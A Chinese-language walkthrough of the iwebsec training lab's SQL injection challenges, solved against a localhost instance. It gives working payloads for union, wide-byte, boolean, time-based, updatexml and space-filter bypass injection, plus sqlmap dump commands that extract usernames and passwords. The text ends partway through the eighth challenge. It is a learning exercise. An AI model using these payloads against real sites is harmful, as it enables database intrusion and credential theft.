# iwebsec刷题记录-SQL注入漏洞
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
被推荐了这个web平台，感觉挺适合新手的，网上搜了下没看到有人写wp，这里本入门萌新来稍微整理下自己解题的过程
## SQL注入漏洞
###  01-数字型注入
`http://localhost:32774/sqli/01.php?id=1'`  
发现有报错
> You have an error in your SQL syntax; check the manual that corresponds to
> your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at
> line 1
猜测语句  
`WHERE id=$id LIMIT 0,1`  
验证一下
查列数
查显示位
爆库  
`http://localhost:32774/sqli/01.php?id=1%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata%20--+`
爆表  
`http://localhost:32774/sqli/01.php?id=1%20union%20select%201,2,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())%20--+`
爆列  
`http://localhost:32774/sqli/01.php?id=1%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema%20=database()%20and%20table_name=%27users%27)%20--+`
爆数据  
`http://localhost:32774/sqli/01.php?id=1%20union%20select%201,2,(select%20group_concat(concat(role,0x7e,username,0x3A,password,0x7e))%20from%20users)%20%20--+`
###  02-字符型注入
`http://localhost:32774/sqli/02.php?id=1' or '1=2–'`  
报错
> You have an error in your SQL syntax; check the manual that corresponds to
> your MySQL server version for the right syntax to use near ‘’1’ or ’1=2–’’
> LIMIT 0,1’ at line 1
看源码，发现`SET NAMES gbk`猜测宽字节注入  
尝试  
`http://localhost:32774/sqli/02.php?id=1%df' and 1=2 union select 1,2,3 --+`
爆库  
`http://localhost:32774/sqli/02.php?id=1%df' and 1=2 union select
1,2,group_concat(schema_name) from information_schema.schemata --+`
爆表  
`http://localhost:32774/sqli/02.php?id=1%df' and 1=2 union select 1,2,(select
group_concat(table_name) from information_schema.tables where
table_schema=database()) --+`
爆数据  
`http://localhost:32774/sqli/02.php?id=1%df' and 1=2 union select 1,2,(select
group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users) --+`
这里除了前面通过宽字节来让mysql以为是个汉字绕过检查其他和第一题一样
###  03-bool注入
`http://localhost:32774/sqli/03.php?id=1 and 1=2 --+`
检测出来存在是布尔注入就懒得写jio本了，sqlmap直接梭  
爆库  
`sqlmap -u http://localhost:32774/sqli/03.php?id=1 --current-db`
爆表  
`sqlmap -u http://localhost:32774/sqli/03.php?id=1 -D iwebsec --tables`
爆列  
`sqlmap -u http://localhost:32774/sqli/03.php?id=1 -D iwebsec -T users
--columns`
爆数据  
`sqlmap -u http://localhost:32774/sqli/03.php?id=1 -D iwebsec -T users -C
role,username,password --dump`
###  04-sleep注入
自己的脚本真的很丑，这里就不丢脸了  
时间盲注爆库  
`sqlmap -u http://localhost:32774/sqli/04.php?id=1 -p id --technique T --time-sec 3 --current-db`
爆表  
`sqlmap -u http://localhost:32774/sqli/04.php?id=1 -p id --technique T --time-sec 3 -D iwebsec --tables`
爆列  
`sqlmap -u http://localhost:32774/sqli/04.php?id=1 -p id --technique T --time-sec 3 -D iwebsec -T user --columns`
爆数据  
`sqlmap -u http://localhost:32774/sqli/04.php?id=1 -p id --technique T --time-sec 3 -D iwebsec -T user -C id,password,username --dump`
###  05-updatexml注入
这题限制条件没弄好，用第一题的payload都能跑  
但还是用题目的预期过一遍  
`and (updatexml(1,concat(0x7e,(select version()),0x7e),1))`
先检验  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
version()),0x7e),1))`  
存在注入，并使用updatexml函数注入  
爆库  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
group_concat(schema_name) from information_schema.schemata),0x7e),1))`
爆表  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
(select group_concat(table_name) from information_schema.tables where
table_schema=database())),0x7e),1))`
爆列  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
(select group_concat(column_name) from information_schema.columns where
table_schema =database() and table_name='users')),0x7e),1))`
爆数据  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
(select group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from
users)),0x7e),1))`
###  06-宽字节注入
这题看题目就是宽字节，和之前第二题的做法重了，就换个方法，用sqlmap过一遍  
这里需要知道的是直接  
`sqlmap -u http://localhost:32774/sqli/06.php?id=1`  
是找不到注入的,需要  
`sqlmap -u http://localhost:32774/sqli/06.php?id=1%df%27`  
或者使用tamper=”unmagicquotes”  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
--current-db`  
爆库  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
--current-db`  
爆表  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
-D iwebsec --tables`  
爆列  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
-D iwebsec -T users --colums`  
爆数据  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
-D iwebsec -T users -C role,username,password --dump`
###  07-空格过滤绕过
看题可知过滤了空格，这里我选择用括号让参数之间没有空格  
`http://localhost:32774/sqli/07.php?id=(0)or(1)=(1)`
查显示位  
`http://localhost:32774/sqli/07.php?id=(0)%0aunion%0aselect(1),(2),(3)`
爆库  
`http://localhost:32774/sqli/07.php?id=(0)%0Aunion%0Aselect(1),(2),(select%0Agroup_concat(schema_name)%0Afrom%0Ainformation_schema.schemata)`
爆表  
`localhost:32774/sqli/07.php?id=(0)%0Aunion%0Aselect(1),(2),(select%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database())`
爆列  
`http://localhost:32774/sqli/07.php?id=(0)%0Aunion%0Aselect(1),(2),(select%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0awhere%0atable_schema=database()and(table_name='users'))`
爆数据  
`http://localhost:32774/sqli/07.php?id=(0)%0Aunion%0Aselect(1),(2),(select%0Agroup_concat(concat(role,0x7e,username,0x3A,password,0x7e))%0Afrom%0Ausers)`
###  08-大小写过滤绕过
常规测试后发现测试点在select上，根据题目只要对select进行大小写变换就行  
显示位